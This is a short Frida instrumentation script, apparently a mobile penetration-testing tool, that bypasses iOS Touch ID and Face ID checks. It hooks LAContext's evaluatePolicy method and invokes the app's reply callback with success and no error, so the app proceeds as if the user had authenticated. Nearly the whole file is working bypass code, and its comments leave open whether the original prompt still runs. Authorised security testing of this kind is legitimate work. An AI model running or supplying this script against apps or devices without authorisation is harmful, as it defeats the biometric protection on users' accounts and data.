/*
    Biometric Authentication Bypass (TouchID / FaceID)
    Hooks LAContext to bypass evaluation.
*/

if (ObjC.available) {
    try {
        console.log("[*] Biometric Bypass loaded");

        var LAContext = ObjC.classes.LAContext;

        // Hook evaluatePolicy:localizedReason:reply:
        Interceptor.attach(LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
            onEnter: function (args) {
                console.log("[*] Detected Biometric Check (evaluatePolicy)");
                var reply = new ObjC.Block(args[4]);

                // Call the reply block with success (true) and no error (nil)
                // The block signature is usually void ^(BOOL success, NSError *error)
                var callback = reply.implementation;
                var callbackFunc = new NativeFunction(callback, 'void', ['pointer', 'int', 'pointer']);

                // Invoke immediately to bypass
                callbackFunc(args[4], 1, ptr("0x0"));

                // Prevent original call logic or ensure it doesn't override?
                // Actually if we call the callback, the app logic should proceed.
                // We might want to NOT call the original implementation to avoid the UI prompt.
            },
            onLeave: function (retval) {
                // If we didn't call original keys, we might need to handle return.
            }
        });

        // Also hook evaluateAccessControl:localizedReason:reply:
        // And other variants if needed.

        console.log("[+] Hooks installed for LAContext");

    } catch (e) {
        console.log("[!] Error in Biometric Bypass: " + e.message);
    }
}
